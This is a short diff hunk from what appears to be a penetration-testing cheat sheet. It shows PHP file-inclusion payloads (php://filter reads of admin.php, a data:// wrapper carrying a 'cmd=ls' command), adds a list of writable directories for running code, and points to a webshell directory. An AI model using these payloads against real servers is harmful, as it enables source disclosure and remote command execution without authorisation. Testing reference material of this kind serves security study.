@@ -239,6 +239,11 @@ php://filter/resource=admin.php
 php://filter/convert.base64-encode/resource=admin.php
 
 data://text/plain;base64,<base64>&cmd=ls
+
+# EXEC
+/tmp
+/var/crash
+/dev/shm
 ```
 ## Webshell
 /usr/share/webshells
